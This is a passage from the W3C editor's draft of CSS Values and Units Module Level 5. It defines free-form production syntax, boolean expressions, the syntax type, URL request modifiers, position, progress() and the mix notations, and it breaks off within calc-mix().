<!-- https://drafts.csswg.org/css-values-5/, as of 2026-10-19; written by dev/spec_text.py -->

[image: W3C]

# <a id="title"></a>CSS Values and Units Module Level 5

<a id="w3c-state"></a>Editor’s Draft, 4 September 2026

More details about this document

**This version: **
: https://drafts.csswg.org/css-values-5/
**Latest published version: **
: https://www.w3.org/TR/css-values-5/
**Feedback: **
: CSSWG Issues Repository
: [Inline In Spec](#issues-index)
**Editors: **
: Tab Atkins (Google)
: Elika J. Etemad / fantasai (Apple)
: Miriam E. Suzanne (Invited Expert)
**Suggest an Edit for this Spec: **
: GitHub Editor
**Test Suite: **
: https://wpt.fyi/results/css/css-values/
Copyright © 2026 World Wide Web Consortium. W3C^® liability, trademark and permissive document license rules apply.

## <a id="abstract"></a>Abstract

This CSS module describes the common values and units that CSS properties accept and the syntax used for describing them in CSS property definitions.

CSS is a language for describing the rendering of structured documents (such as HTML and XML) on screen, on paper, etc.

## <a id="sotd"></a>Status of this document

This is a public copy of the editors’ draft. It is provided for discussion only and may change at any moment. Its publication here does not imply endorsement of its contents by W3C. Don’t cite this document other than as work in progress.

Please send feedback by filing issues in GitHub (preferred), including the spec code “css-values” in the title, like this: “[css-values] *…summary of comment…*”. All issues and comments are archived. Alternately, feedback can be sent to the (archived) public mailing list www-style@w3.org.

This document is governed by the <a id="w3c_process_revision"></a>18 August 2025 W3C Process Document.

**This spec is in the early exploration phase. Feedback is welcome, and and major breaking changes are expected.**

## <a id="intro"></a>1. Introduction

<a id="issue-39df5f37"></a> **This is a diff spec against [CSS Values and Units Level 4](css-values-4.md).**

### <a id="placement"></a>1.1. Module Interactions

This module extends [[CSS-VALUES-4]](#biblio-css-values-4) which replaces and extends the data type definitions in [[CSS21]](#biblio-css21) sections 1.4.2.1, 4.3, and A.2.

## <a id="textual-values"></a>2. Textual Data Types

See [CSS Values 4 § 4 Textual Data Types](css-values-4.md#textual-values).

## <a id="value-defs"></a>3. Value Definition Syntax

See [CSS Values 4 § 2 Value Definition Syntax](css-values-4.md#value-defs).

Additionally,

1. Boolean combinations of a conditional notation. These are written using the [<boolean-expr[]>](#typedef-boolean-expr) notation, and represent recursive expressions of boolean logic using keywords and parentheses, applied to the grammar specified in brackets, e.g. [<boolean-expr[ ( &lt;media-feature&gt; ) ]>](#typedef-boolean-expr) to express media queries.

### <a id="component-functions"></a>3.1. Functional Notation Definitions

See [CSS Values 4 § 2.6 Functional Notation Definitions](css-values-4.md#component-functions).

#### <a id="component-function-commas"></a>3.1.1. Commas in Function Arguments

[Functional notation](css-values-4.md#functional-notation) often uses commas to separate parts of its internal grammar, and occasionally other syntax (such as `:` or `;` in [if()](#funcdef-if)). However, some functions (such as [mix()](#funcdef-mix)) allow values that, themselves, could contain these argument-separating tokens. These values (currently [<whole-value>](#whole-value), [<declaration-value>](css-syntax-3.md#typedef-declaration-value), and [<any-value>](css-syntax-3.md#typedef-any-value)) are *<a id="free-form-productions"></a>free-form productions*.

To accommodate these sorts of grammars unambiguously, the [free-form productions](#free-form-productions) can be optionally wrapped in curly braces {}. These braces are syntactic, not part of the actual value, and only serve to explicitly indicate the bounds of the production. A free-form production can either (after optional whitespace) start with a [<{-token>](css-syntax-3.md#tokendef-open-curly), or not:

**If it does not start with a "{" token **
:

The production does not match any top-level commas or {} blocks. (The production stops parsing at that point, so the comma or {} block is matched by the next grammar term instead; probably the function’s own argument-separating comma.) Individual usages of the production can define additional tokens that are similarly restricted from matching at the top-level.

**If it does start with a "{" token **
:

The production matches just the {} block that the "{" token opens. It represents the *contents* of that block, ignoring the {} block wrapper itself.

Note: General restrictions defined for a particular [free-form production](#free-form-productions), like [<declaration-value>](css-syntax-3.md#typedef-declaration-value) not matching [<semicolon-token>](css-syntax-3.md#typedef-semicolon-token)s, apply regardless of whether it’s {}-wrapped or not.

<a id="example-5ade5fea"></a> For example, the grammar of the [random-item()](#funcdef-random-item) function is:

```
random-item( <random-key>, [<declaration-value>?]# )
```

The # indicates comma-separated repetitions, so randomly choosing between three keywords would be written as normal for functions, like:

```
font-family: random-item(--x, serif, sans-serif, monospace);
```

However, sometimes the values you want to choose between need to include commas. When this is the case, wrapping the values in {} allows their commas to be distinguished from the function’s argument-separating commas:

```
font-family: random-item(--x, {Times, serif}, {Arial, sans-serif}, {Courier, monospace});
```

This randomly chooses one of three font-family lists: either Times, serif, or Arial, sans-serif, or Courier, monospace.

This is not all-or-nothing; you can use {} around *some* arguments that need it, while leaving others bare when they don’t need it. You are also allowed to use {} around a value when it’s not strictly required. For example:

```
font-family: random-item(--x, {Times, serif}, sans-serif, {monospace});
```

This represents choosing between three font-family lists: either Times, serif, or sans-serif, or monospace.

However, this {}-wrapping is *only* allowed for some function arguments—​those defined as [free-form productions](#free-form-productions). It’s not valid for any other productions; if you use {} around other function arguments, it’ll just fail to match the function’s grammar and become invalid. For example, the following is **invalid**:

```
background-image: linear-gradient(to left, {red}, magenta);
```

Note: Because {} wrappers are allowed even when not explicitly required, they can be used defensively around values when the author isn’t sure if they’ll end up containing commas or not, due to [arbitrary substitution functions](#arbitrary-substitution-function) like var(). For example, font-family: random-item(--x, {var(--list1)}, monospace) will work correctly regardless of whether the --list1 custom property contains a comma-separated list or not.

[Functional notations](css-values-4.md#functional-notation) are serialized without {} wrappers whenever possible.

The following generic productions are [free-form productions](#free-form-productions):

-
[<any-value>](css-syntax-3.md#typedef-any-value)
-
[<whole-value>](#whole-value)
-
[<declaration-value>](css-syntax-3.md#typedef-declaration-value)

For legacy compat reasons, the [<declaration-value>](css-syntax-3.md#typedef-declaration-value) defined for the fallback value of var() is a *<a id="non-strict-free-form-production"></a>non-strict free-form production*. It ignores the rules restricting what it can contain when it does not start with a "{" token: it is allowed to contain commas and {} blocks. It still follows the standard [free-form production](#free-form-productions) rules when it *does* start with a "{" token, however: the fallback is just the contents of the {} block, and doesn’t include the {} wrapper itself.

Other contexts *may* define that they use [non-strict free-form productions](#non-strict-free-form-production), but it *should* be avoided unless necessary.

### <a id="boolean"></a>3.2. Boolean Expression Multiplier [<boolean-expr[]>](#typedef-boolean-expr)

Several contexts (such as @media, @supports, [if()](#funcdef-if), ...) specify conditions, and allow combining those conditions with boolean logic (and/or/not/grouping). Because they use the same non-trivial recursive syntax structure, the special *<a id="typedef-boolean-expr"></a>[<boolean-expr>](#typedef-boolean-expr)* production represents this pattern generically.

The [<boolean-expr[]>](#typedef-boolean-expr) notation wraps another value type in the square brackets within it, e.g. <boolean[ <test> ]>, and represents that value type alone as well as boolean combinations using the not, and, and or keywords and grouping parenthesis. It is formally equivalent to:

```
<boolean-expr[ <test> ]> = not <boolean-expr-group> | <boolean-expr-group>
                                            [ [ and <boolean-expr-group> ]*
                                            | [ or <boolean-expr-group> ]* ]

<boolean-expr-group> = <test> | ( <boolean-expr[ <test> ]> ) | <general-enclosed>
```

The [<boolean-expr[]>](#typedef-boolean-expr) production represents a true, false, or unknown value. Its value is resolved using 3-value Kleene logic, with top-level unknown values (those not directly nested inside the grammar of another <boolean-expr[]>) resolving to false unless otherwise specified; see [Appendix B: Boolean Logic](#boolean-logic) for details.

<a id="example-431f6d8a"></a> For example, the @container rule allows a wide variety of tests: including size queries, style queries, and scroll-state queries. All of these are arbitrarily combinable with boolean logic. Using [<boolean-expr[]>](#typedef-boolean-expr), the grammar for an @container query could be written as:

```
<container-query> = <boolean-expr[ <cq-test> ]>
<cq-test> = (<size-query>) | style( <style-query> ) | scroll-state( <scroll-state-query> )
<size-query> = <boolean-expr[ ( <size-feature> ) ]> | <size-feature>
<style-query> = <boolean-expr[ ( <style-feature> ) ]> | <style-feature>
<scroll-state-query> = <boolean-expr[ ( <scroll-state-feature> ) ]> | <scroll-state-feature>
```

The <general-enclosed> branch of the logic allows for future compatibility—​unless otherwise specified new expressions in an older UA will be parsed and considered “unknown”, rather than invalidating the production. For consistency with that allowance, the <test> term in a [<boolean-expr[]>](#typedef-boolean-expr) should be defined to match <general-enclosed>.

### <a id="css-syntax"></a>3.3. Specifying CSS Syntax in CSS: the [<syntax>](#typedef-syntax) type

Some features in CSS, such as the [attr()](#funcdef-attr) function or registered custom properties, allow you to specify how *another* value is meant to be parsed. This is declared via the [<syntax>](#typedef-syntax) production, which resembles a limited form of the CSS [value definition syntax](css-values-4.md#css-value-definition-syntax) used in specifications to define CSS features, and which represents a syntax definition:

```
<a id="typedef-syntax"></a><syntax> = '*' | <syntax-component> [ <syntax-combinator> <syntax-component> ]* | <syntax-string>
<a id="typedef-syntax-component"></a><syntax-component> = <syntax-single-component> <syntax-multiplier>?
                   | '<' transform-list '>'
<a id="typedef-syntax-single-component"></a><syntax-single-component> = '<' <syntax-type-name> '>' | <ident>
<a id="typedef-syntax-type-name"></a><syntax-type-name> = angle | color | custom-ident | image | integer
                   | length | length-percentage | number
                   | percentage | resolution | string | time
                   | url | transform-function
<a id="typedef-syntax-combinator"></a><syntax-combinator> = '|'
<a id="typedef-syntax-multiplier"></a><syntax-multiplier> = [ '#' | '+' ]

<a id="typedef-syntax-string"></a><syntax-string> = <string>
```

A [<syntax-component>](#typedef-syntax-component) consists of either a [<syntax-type-name>](#typedef-syntax-type-name) between <> (angle brackets), which maps to one of the supported syntax component names, or an [<ident>](css-values-4.md#typedef-ident), which represents any [keyword](css-values-4.md#css-keyword). Additionally, a <syntax-component> may contain a multiplier, which indicates a list of values.

Note: This means that `<length>` and `length` are two different types: the former describes a [<length>](css-values-4.md#length-value), whereas the latter describes a [keyword](css-values-4.md#css-keyword) `length`.

Multiple [<syntax-component>](#typedef-syntax-component)s may be combined with a `|` [<delim-token>](css-syntax-3.md#typedef-delim-token), causing the syntax components to be matched against a value in the specified order.

<a id="example-2dceeea6"></a>

```
<percentage> | <number> | auto
```

The above, when parsed as a [<syntax>](#typedef-syntax), would accept [<percentage>](css-values-4.md#percentage-value) values, [<number>](css-values-4.md#number-value) values, as well as the keyword `auto`.

<a id="example-a723371b"></a>

```
red | <color>
```

The syntax definition resulting from the above [<syntax>](#typedef-syntax), when used as a grammar for [parsing](css-syntax-3.md#css-parse-something-according-to-a-css-grammar), would match an input `red` as an [identifier](css-values-4.md#css-css-identifier), but would match an input `blue` as a <color>.

The `*` [<delim-token>](css-syntax-3.md#typedef-delim-token) represents the universal syntax definition.

The `<transform-list>` production is a convenience form equivalent to `<transform-function>+`. Note that `<transform-list>` may not be followed by a [<syntax-multiplier>](#typedef-syntax-multiplier).

[Whitespace](css-syntax-3.md#whitespace) is not allowed between the angle bracket [<delim-token>](css-syntax-3.md#typedef-delim-token)s (`<` `>`) and the [<syntax-type-name>](#typedef-syntax-type-name) they enclose, nor is whitespace allowed to precede a [<syntax-multiplier>](#typedef-syntax-multiplier).

Note: The [whitespace](css-syntax-3.md#whitespace) restrictions also apply to `<transform-list>`.

A [<syntax-string>](#typedef-syntax-string) is a [<string>](css-values-4.md#string-value) whose value successfully [parses](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) as a [<syntax>](#typedef-syntax), and represents the same value as that <syntax> would.

Note: [<syntax-string>](#typedef-syntax-string) mostly exists for historical purposes; before [<syntax>](#typedef-syntax) was defined, the @property rule used a [<string>](css-values-4.md#string-value) for this purpose.

#### <a id="parse-syntax"></a>3.3.1. Parsing as [<syntax>](#typedef-syntax)

The purpose of a [<syntax>](#typedef-syntax) is usually to specify how to parse another value (such as the value of a registered custom property, or an attribute value in [attr()](#funcdef-attr)). However, the generic [parse something according to a CSS grammar](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) algorithm returns an unspecified internal structure, since parse results might be ambiguous and need further massaging.

To avoid these issues and get a well-defined result, use [parse with a <syntax>](#parse-with-a-syntax):

To *<a id="parse-with-a-syntax"></a>parse with a [<syntax>](#typedef-syntax)* given a string or list or [component values](css-syntax-3.md#component-value) *values*, a [<syntax>](#typedef-syntax) value *syntax*, and optionally an element *el* for context, perform the following steps. It returns either CSS values, or the guaranteed-invalid value.

1.
[Parse a list of component values](css-syntax-3.md#parse-a-list-of-component-values) from *values*, and let *raw parse* be the result.
2.
If *el* was given, [substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in *raw parse*, and set *raw parse* to that result.
3.
[parse](css-syntax-3.md#css-parse-something-according-to-a-css-grammar) *values* according to *syntax*, with a * value treated as `[<declaration-value>](css-syntax-3.md#typedef-declaration-value)?`, and let *parsed result* be the result. If *syntax* used a | combinator, let *parsed result* be the parse result from the first matching clause.
4.
If *parsed result* is failure, return the guaranteed-invalid value.
5.
Assert: *parsed result* is now a well-defined list of one or more CSS values, since each branch of a [<syntax>](#typedef-syntax) defines an unambiguous parse result (or the * syntax is unambiguous on its own).
6.
Return *parsed result*.

Note: This algorithm does not resolved the parsed values into [computed values](css-cascade-5.md#computed-value); the context in which the value is used will usually do that already, but if not, the invoking algorithm will need to handle that on its own.

## <a id="level-4-extensions"></a>4. Extensions to Level 4 Value Types

See [CSS Values and Units Level 4](css-values-4.md).

### <a id="urls"></a>4.1. Resource Locators: the [<url>](css-values-4.md#url-value) type

See [CSS Values 4 § 4.5 Resource Locators: the <url> type](css-values-4.md#urls).

#### <a id="request-url-modifiers"></a>4.1.1. Request URL Modifiers

*<a id="typedef-request-url-modifier"></a>[<request-url-modifier>](#typedef-request-url-modifier)*s are [<url-modifier>](css-values-4.md#typedef-url-modifier)s that affect the [<url>](css-values-4.md#url-value)’s resource request by applying associated [URL request modifier steps](css-values-4.md#url-request-modifier-steps). See [CSS Values 4 § 4.5.4 URL Processing Model](css-values-4.md#url-processing).

This specification defines the following [<request-url-modifier>](#typedef-request-url-modifier)s:

```
<request-url-modifier> = <cross-origin-modifier> | <integrity-modifier> | <referrer-policy-modifier>
<cross-origin-modifier> = cross-origin(anonymous | use-credentials)
<integrity-modifier> = integrity(<string>)
<referrer-policy-modifier> = referrer-policy(no-referrer | no-referrer-when-downgrade | same-origin | origin | strict-origin | origin-when-cross-origin | strict-origin-when-cross-origin | unsafe-url)
```

***<a id="typedef-request-url-modifier-cross-origin-modifier"></a>[<cross-origin-modifier>](#typedef-request-url-modifier-cross-origin-modifier)* = *<a id="funcdef-request-url-modifier-cross-origin"></a>cross-origin*(*<a id="valdef-request-url-modifier-anonymous"></a>anonymous* | *<a id="valdef-request-url-modifier-use-credentials"></a>use-credentials*) **
: The [URL request modifier steps](css-values-4.md#url-request-modifier-steps) for this modifier given request *req* are:

1.
Set *req*’s mode to "cors".
2.
If the given value is [use-credentials](#valdef-request-url-modifier-use-credentials), set *req*’s credentials mode to "include".
3.
Otherwise, set *req*’s credentials mode to "same-origin".

***<a id="typedef-request-url-modifier-integrity-modifier"></a>[<integrity-modifier>](#typedef-request-url-modifier-integrity-modifier)* = *<a id="funcdef-request-url-modifier-integrity"></a>integrity*([<string>](css-values-4.md#string-value)) **
: The [URL request modifier steps](css-values-4.md#url-request-modifier-steps) for this modifier given request *req* are to set request’s integrity metadata to the given [<string>](css-values-4.md#string-value).
***<a id="typedef-request-url-modifier-referrer-policy-modifier"></a>[<referrer-policy-modifier>](#typedef-request-url-modifier-referrer-policy-modifier)* = *<a id="funcdef-request-url-modifier-referrer-policy"></a>referrer-policy*(*<a id="valdef-request-url-modifier-no-referrer"></a>no-referrer* | *<a id="valdef-request-url-modifier-no-referrer-when-downgrade"></a>no-referrer-when-downgrade* | *<a id="valdef-request-url-modifier-same-origin"></a>same-origin* | *<a id="valdef-request-url-modifier-origin"></a>origin* | *<a id="valdef-request-url-modifier-strict-origin"></a>strict-origin* | *<a id="valdef-request-url-modifier-origin-when-cross-origin"></a>origin-when-cross-origin* | *<a id="valdef-request-url-modifier-strict-origin-when-cross-origin"></a>strict-origin-when-cross-origin* | *<a id="valdef-request-url-modifier-unsafe-url"></a>unsafe-url*) **
: The [URL request modifier steps](css-values-4.md#url-request-modifier-steps) for this modifier given request *req* are to set request’s referrer policy to the `ReferrerPolicy` that matches the given value.
To *<a id="apply-request-modifiers-from-url-value"></a>apply request modifiers from URL value* given a request *req* and a [<url>](css-values-4.md#url-value) *url*, call the [URL request modifier steps](css-values-4.md#url-request-modifier-steps) for *url*’s [<request-url-modifier>](#typedef-request-url-modifier)s in sequence given *req*.

### <a id="position"></a>4.2. 2D Positioning: the [<position>](#typedef-position) type

The *<a id="typedef-position"></a>[<position>](#typedef-position)* value specifies the position of an alignment subject (e.g. a background image) inside an alignment container (e.g. its [background positioning area](css-backgrounds-3.md#background-positioning-area)) as a pair of offsets between the specified edges (defaulting to the left and top). Its syntax is:

```
<position> = <position-one> | <position-two> | <position-four>
<a id="typedef-position-one"></a><position-one> = [
  left | center | right | top | bottom |
  x-start | x-end | y-start | y-end |
  block-start | block-end | inline-start | inline-end |
  <length-percentage>
]
<a id="typedef-position-two"></a><position-two> = [
  [ left | center | right | x-start | x-end ] &&
  [ top | center | bottom | y-start | y-end ]
|
  [ left | center | right | x-start | x-end | <length-percentage> ]
  [ top | center | bottom | y-start | y-end | <length-percentage> ]
|
  [ block-start | center | block-end ] &&
  [ inline-start | center | inline-end ]
|
  [ start | center | end ]{2}
]
<a id="typedef-position-four"></a><position-four> = [
  [ [ left | right | x-start | x-end ] <length-percentage> ] &&
  [ [ top | bottom | y-start | y-end ] <length-percentage> ]
|
  [ [ block-start | block-end ] <length-percentage> ] &&
  [ [ inline-start | inline-end ] <length-percentage> ]
|
  [ [ start | end ] <length-percentage> ]{2}
]
```

If only one value is specified ([<position-one>](#typedef-position-one)), the second value is assumed to be [center](#valdef-position-center).

If two values are given ([<position-two>](#typedef-position-two)), a [<length-percentage>](css-values-4.md#typedef-length-percentage) as the first value represents the horizontal position as the offset between the left edges of the alignment subject and alignment container, and a <length-percentage> as the second value represents the vertical position as an offset between their top edges.

If both keywords are one of start or end, the first one represents the block axis and the second the inline axis.

Note: A pair of axis-specific keywords can be reordered, while a combination of keyword and length or percentage cannot. So center left or inline-start block-end is valid, while 50% left is not. start and end aren’t axis-specific, so start end and end start represent two different positions.

If four values are given ([<position-four>](#typedef-position-four)) then each [<length-percentage>](css-values-4.md#typedef-length-percentage) represents an offset between the edges specified by the preceding keyword. For example, [background-position: bottom 10px right 20px](css-backgrounds-3.md#propdef-background-position) represents a 10px vertical offset up from the bottom edge and a 20px horizontal offset leftward from the right edge.

Positive values represent an offset *inward* from the edge of the alignment container. Negative values represent an offset *outward* from the edge of the alignment container.

<a id="example-0b808127"></a> The following declarations give the stated (horizontal, vertical) offsets from the top left corner:

```
background-position: left 10px top 15px;   /* 10px, 15px */
background-position: left      top     ;   /*  0px,  0px */
background-position:      10px     15px;   /* 10px, 15px */
background-position: left          15px;   /*  0px, 15px */
background-position:      10px top     ;   /* 10px,  0px */
```

<a id="example-88922ca3"></a> [<position>](#typedef-position)s can also be relative to other corners than the top left. For example, the following puts the background image 10px from the bottom and 3em from the right:

```
background-position: right 3em bottom 10px
```

The [computed value](css-cascade-5.md#computed-value) of a [<position>](#typedef-position) is a pair of offsets (horizontal and vertical), each given as a computed [<length-percentage>](css-values-4.md#typedef-length-percentage) value, representing the distance between the left edges and top edges (respectively) of the alignment subject and alignment container.

***<a id="valdef-position-length-percentage"></a>[<length-percentage>](css-values-4.md#typedef-length-percentage)* **
: A [<length-percentage>](css-values-4.md#typedef-length-percentage) value specifies the size of the offset between the specified edges of the alignment subject and alignment container.

For example, for [background-position: 2cm 1cm](css-backgrounds-3.md#propdef-background-position), the top left corner of the background image is placed 2cm to the right and 1cm below the top left corner of the [background positioning area](css-backgrounds-3.md#background-positioning-area).

A [<percentage>](css-values-4.md#percentage-value) for the horizontal offset is relative to (*width of alignment container* - *width of alignment subject*). A <percentage> for the vertical offset is relative to (*height of alignment container* - *height of alignment subject*).

<a id="example-0fd7dab3"></a> For example, with a value pair of 0% 0%, the upper left corner of the alignment subject is aligned with the upper left corner of the alignment container A value pair of 100% 100% places the lower right corner of the alignment subject in the lower right corner of the alignment container. With a value pair of 75% 50%, the point 75% across and 50% down the alignment subject is to be placed at the point 75% across and 50% down the alignment container.

[image: Diagram of image position within element]

Diagram of the meaning of [background-position: 75% 50%](css-backgrounds-3.md#propdef-background-position).

***<a id="valdef-position-top"></a>top* **
***<a id="valdef-position-right"></a>right* **
***<a id="valdef-position-bottom"></a>bottom* **
***<a id="valdef-position-left"></a>left* **
: Offsets the top/left/right/bottom edges (respectively) of the alignment subject and alignment container by the specified amount (defaulting to 0%) in the corresponding axis.
***<a id="valdef-position-y-start"></a>y-start* **
***<a id="valdef-position-y-end"></a>y-end* **
***<a id="valdef-position-x-start"></a>x-start* **
***<a id="valdef-position-x-end"></a>x-end* **
: Computes the same as the physical edge keyword corresponding to the start/end side in the y/x axis.
***<a id="valdef-position-block-start"></a>block-start* **
***<a id="valdef-position-block-end"></a>block-end* **
***<a id="valdef-position-inline-start"></a>inline-start* **
***<a id="valdef-position-inline-end"></a>inline-end* **
: Computes the same as the physical edge keyword corresponding to the start/end side in the block/inline axis.
***<a id="valdef-position-center"></a>center* **
: Computes to a 50% offset in the corresponding axis.
Unless otherwise specified, the flow-relative keywords are resolved according to the writing mode of the element on which the value is specified.

Note: The [background-position](css-backgrounds-3.md#propdef-background-position) property also accepts a three-value syntax. This has been disallowed generically because it creates parsing ambiguities when combined with other length or percentage components in a property value.

<a id="issue-8e940682"></a> Need to define how this syntax would expand to the longhands of [background-position](css-backgrounds-3.md#propdef-background-position) if e.g. var() is used for some (or all) of the components. [Issue #9690]

#### <a id="position-parsing"></a>4.2.1. Parsing [<position>](#typedef-position)

When specified in a grammar alongside other keywords, [<length>](css-values-4.md#length-value)s, or [<percentage>](css-values-4.md#percentage-value)s, [<position>](#typedef-position) is *greedily* parsed; it consumes as many components as possible.

<a id="example-2622a7d7"></a> For example, [transform-origin](css-transforms-1.md#propdef-transform-origin) defines a 3D position as (effectively) [<position>](#typedef-position) [<length>](css-values-4.md#length-value)?. A value such as left 50px will be parsed as a 2-value [<position>](#typedef-position), with an omitted z-component; on the other hand, a value such as top 50px will be parsed as a single-value <position> followed by a [<length>](css-values-4.md#length-value).

#### <a id="position-serialization"></a>4.2.2. Serializing [<position>](#typedef-position)

When serializing the [specified value](css-cascade-5.md#specified-value) of a [<position>](#typedef-position):

**If only one component is specified: **
:

-
The implied [center](css-backgrounds-3.md#valdef-background-position-center) keyword is added, and a 2-component value is serialized.

**If two components are specified: **
:

-
Keywords are serialized as keywords.
-
[<length-percentage>](css-values-4.md#typedef-length-percentage)s are serialized as <length-percentage>s.
-
Components are serialized horizontal first, then vertical.

**If four components are specified: **
:

-
Keywords and offsets are both serialized.
-
Components are serialized horizontal first, then vertical; alternatively block-axis first, then inline-axis.

Note: [<position>](#typedef-position) values are never serialized as a single value, even when a single value would produce the same behavior, to avoid causing parsing ambiguities in some grammars where a <position> is placed next to a [<length>](css-values-4.md#length-value), such as [transform-origin](css-transforms-1.md#propdef-transform-origin).

The [computed value](css-cascade-5.md#computed-value) of a [<position>](#typedef-position) is serialized as a pair of [<length-percentage>](css-values-4.md#typedef-length-percentage)s representing offsets from the left and top edges, in that order.

#### <a id="combine-positions"></a>4.2.3. Combination of [<position>](#typedef-position)

[Interpolation](css-values-4.md#interpolation) of [<position>](#typedef-position) is defined as the independent interpolation of each component (x, y) normalized as an offset from the top left corner as a [<length-percentage>](css-values-4.md#typedef-length-percentage).

[Addition](css-values-4.md#addition) of [<position>](#typedef-position) is likewise defined as the independent addition each component (x, y) normalized as an offset from the top left corner as a [<length-percentage>](css-values-4.md#typedef-length-percentage).

## <a id="progress"></a>5. <a id="progress-func"></a> Interpolation Progress Calculations: the [progress()](#funcdef-progress) notation

The *<a id="funcdef-progress"></a>progress()* [functional notation](css-values-4.md#functional-notation) represents the proportional distance of a given value (the *<a id="progress-value"></a>progress value*) from one value (the *<a id="progress-start-value"></a>progress start value*) to another value (the *<a id="progress-end-value"></a>progress end value*), each represented as a [calculation](css-values-4.md#calc-calculation). It is a [math function](css-values-4.md#math-function), and can be input into other calculations such as a math function or a [mix notation](#mix-notations). The syntax of [progress()](#funcdef-progress) is:

```
<progress()> = progress(no-clamp? <calc-sum>, <calc-sum>, <calc-sum>)
```

where the first, second, and third [<calc-sum>](css-values-4.md#typedef-calc-sum) values represent the [progress value](#progress-value), [progress start value](#progress-start-value), and [progress end value](#progress-end-value), respectively.

If *<a id="valdef-progress-no-clamp"></a>no-clamp* is present, the [progress()](#funcdef-progress) function can potentially resolve to any number; if omitted (the default), the return value is clamped to the range [0, 1].

The argument [calculations](css-values-4.md#calc-calculation) can resolve to any [<number>](css-values-4.md#number-value), [<dimension>](css-values-4.md#typedef-dimension), or [<percentage>](css-values-4.md#percentage-value), but must have a [consistent type](css-values-4.md#css-consistent-type) or else the function is invalid.

The result of [progress()](#funcdef-progress) is a [<number>](css-values-4.md#number-value) [made consistent](css-values-4.md#css-make-a-type-consistent) with the [consistent type](css-values-4.md#css-consistent-type) of its arguments, resolved by *<a id="calculate-a-progress-function"></a>calculating a progress function* as follows:

**If the [progress start value](#progress-start-value) and [progress end value](#progress-end-value) are different values **
:

`([progress value](#progress-value) - [progress start value](#progress-start-value)) / ([progress end value](#progress-end-value) - progress start value)`, clamped to the [0,1] range if [no-clamp](#valdef-progress-no-clamp) is not specified.

**If the [progress start value](#progress-start-value) and [progress end value](#progress-end-value) are the same value **
:

0 if [no-clamp](#valdef-progress-no-clamp) is not specified.

Otherwise, 0, -∞, or +∞, depending on whether [progress value](#progress-value) is equal to, less than, or greater than the shared value.

<a id="issue-997f0423"></a> Do we need a percent-progress() notation, or do enough places auto-convert that it’s not necessary?

<a id="issue-c1472b24"></a> Should progress() functions clamp to 0-100%? [Issue #11825]

Note: The [progress()](#funcdef-progress) function is essentially syntactic sugar for a particular pattern of [calc()](css-values-4.md#funcdef-calc) notations.

## <a id="mixing"></a>6. Weighted Average Notations: the *-mix() family

Several *<a id="mix-notations"></a>mix notations* in CSS allow representing the weighted average of a set of values. These [functional notations](css-values-4.md#functional-notation) follow the syntactic pattern:

```
*mix() = *mix( options? , [ value && <percentage>? ]# )
```

where the *options* can provide type-specific mixing options, and each *value* and optional [<percentage>](css-values-4.md#percentage-value) pair in the argument list is a *<a id="mix-item"></a>mix item* representing an input to the mix and its weight in the average.

The [mix notations](#mix-notations) in CSS include:

-
[calc-mix()](#funcdef-calc-mix), for mixing [<number>](css-values-4.md#number-value), [<length>](css-values-4.md#length-value), [<percentage>](css-values-4.md#percentage-value), [<time>](css-values-4.md#time-value), and other dimensions representable in [calc()](css-values-4.md#funcdef-calc) expressions
-
[transform-mix()](#funcdef-transform-mix), for mixing [<transform-list>](css-transforms-1.md#typedef-transform-list)s
-
color-mix(), for mixing <color> values (see [[css-color-5]](#biblio-css-color-5))
-
cross-fade(), for mixing [<image>](css-images-3.md#typedef-image) values (see [[css-images-4]](#biblio-css-images-4))
-
palette-mix(), for mixing font-palette values (see [[css-fonts-4]](#biblio-css-fonts-4))

### <a id="mix-percentage-normalization"></a>6.1. Normalizing Mix Percentages

If the sum of the mix percentages are greater than 100%, they are scaled down; if it is less, any remaining percentage is distributed to values whose [<percentage>](css-values-4.md#percentage-value) is omitted, or else assigned to a “none” type value as defined by the specific [mix notation](#mix-notations).

To *<a id="normalize-mix-percentages"></a>normalize mix percentages* given

-
a list of [mix items](#mix-item) *items* (a value and optional percentage, each between 0% and 100% if specified)
-
an optional *force normalization* flag (defaulting to false),

returning a list of [mix items](#mix-item) with normalized percentages and a “leftover” percentage:

1.
Let *specified sum* be the sum of the percentages specified in *items* (clamped to 100%), or 0% if the percentages are omitted for all items.
2.
For each omitted percentage in *items*, set it to `(100% - *specified sum*) / (number of omitted percentages)`.
3.
Let *total* be the sum of the percentages of all the items.
4.
If *total* is greater than 100%, or if *total* is greater than 0% and the *force normalization* flag is true, multiply every percentage in *items* by `(100% / *total*)`.
5.
If *total* is less than 100%, let *leftover* be `(100% - *total*)`. Otherwise, let *leftover* be 0%.
6.
Return *items* and *leftover*.

Note: At the end of this algorithm, every percentage is set, and the sum of all percentages is either 0% (if they were all specified as 0% to begin with) or 100%. The *leftover* value will be applied to the usage-specific “none” type value mixed into the final result.

### <a id="mix-resolution"></a>6.2. Mix Resolution

The [used value](css-cascade-5.md#used-value) of a valid [mix notation](#mix-notations) is the weighted average of its arguments, as specified by the specific notation.

The [computed value](css-cascade-5.md#computed-value) is the [used value](css-cascade-5.md#used-value) if it is possible to calculate. Otherwise, it is the [mix notation](#mix-notations) itself, with its arguments computed individually.

### <a id="calc-mix"></a>6.3. Weighted Average of Numeric and Dimensional Values: the [calc-mix()](#funcdef-calc-mix) notation

The *<a id="funcdef-calc-mix"></a>calc-mix()* [mix notation](#mix-notations) represents a weighted average of numeric or dimensional value. Like [calc()](css-values-4.md#funcdef-calc), it is a [math function](css-values-4.md#math-function), with the following syntactic form:

```
<calc-mix()> = calc-mix( [ <calc-sum> <percentage [0,100]>? ]# )
```

The [<calc-sum>](css-values-4.md#typedef-calc-sum) arguments can resolve to any [<number>](css-values-4.md#number-value), [<dimension>](css-values-4.md#typedef-dimension), or [<percentage>](css-values-4.md#percentage-value), but must have a [consistent type](css-values-4.md#css-consistent-type) or else the function is invalid. The result’s type will be the consistent type, [made consistent](css-values-4.md#css-make-a-type-consistent) with the type of the <calc-sum> values.

The [used value](css-cascade-5.md#used-value) of a valid [calc-mix()](#funcdef-calc-mix) is the result of producing a weighted average of its [<calc-sum>](css-values-4.md#typedef-calc-sum) values, with the weight of each item given by its corresponding [<percentage>](css-values-4.md#percentage-value) after [normalizing these mix percentages](#normalize-mix-percentages). (Any “leftover” mix percentage is applied to a consistently-typed zero value, and thus effectively discarded.)

